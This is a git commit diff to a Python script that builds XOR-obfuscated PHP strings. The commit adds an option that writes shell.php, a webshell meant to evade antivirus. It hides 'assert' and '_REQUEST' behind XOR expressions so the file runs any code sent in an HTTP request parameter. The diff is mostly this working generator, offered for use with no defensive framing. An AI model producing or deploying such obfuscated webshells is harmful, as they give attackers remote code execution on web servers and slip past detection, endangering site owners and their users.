4b761dc7e9440486c006d206f743b9da5e6ac8cf
hiwoodpeck <117014990+hiwoodpeck@users.noreply.github.com>
2022-11-22 12:43:57 +0800

    Add files via upload
    新增创建shell文件

--- php_XOR_generate/php_XOR_generate.py
+++ php_XOR_generate/php_XOR_generate.py
@@ -8,7 +8,7 @@ def chrXORCreat(ch=''):
 
 def f(ch, index, chr1, chr2):
     if len(ch) <= index:
-        if int(chr1, 2) >= 32 and int(chr1, 2) >= 32:
+        if 33 <= int(chr2, 2) and 33 <= int(chr1, 2):
             return chr(int(chr1, 2)), chr(int(chr2, 2))
         else:
             return ""
@@ -20,24 +20,45 @@ def f(ch, index, chr1, chr2):
             else:
                 return result
         else:
-            return f(ch, index + 1, chr1 + "1", chr2 + "1")
+            result = f(ch, index + 1, chr1 + "1", chr2 + "1")
+            if result == "":
+                return f(ch, index + 1, chr1 + "0", chr2 + "0")
+            else:
+                return result
+
+
+def getXORStr(st="", cs="."):
+    result = ""
+    for index in range(len(st)):
+        if index + 1 == len(st):
+            cs = ""
+        ite1, ite2 = chrXORCreat(st[index])
+        result += f"('{ite1}' ^ '{ite2}'){cs}"
+    return result
 
 
 parser = argparse.ArgumentParser(description='输入字符获取PHP异或运算的两个可行字符.')
 parser.add_argument('-s', '--str', type=str, help='输入字符', required=False)
 parser.add_argument('-c', '--constr', type=str, help='默认为PHP字符的连接符“.”', required=False)
+parser.add_argument('-f', '--file', type=str, default='n', help='是否生成php免杀文件y/n', required=False)
 args = parser.parse_args()
 
 if args.str:
     s = args.str
-else:
-    s = input("请输入参数:")
-if args.constr:
-    constr = args.constr
-else:
-    constr = "."
-for i in range(len(s)):
-    if i + 1 == len(s):
-        constr = ""
-    item1, item2 = chrXORCreat(s[i])
-    print(f"('{item1}' ^ '{item2}')", end=constr)
+    if args.constr:
+        constr = args.constr
+    else:
+        constr = "."
+    print(getXORStr(s, "."))
+
+
+if args.file:
+    if args.file in ['y', 'Y']:
+        with open("shell.php", 'w') as file:
+            par1 = getXORStr("assert", ".")
+            par2 = getXORStr("_REQUEST", ".")
+            file.write(f"""<?php 
+$_={par1};
+$__={par2};
+$___=$$__; 
+$_($___[_]);""")
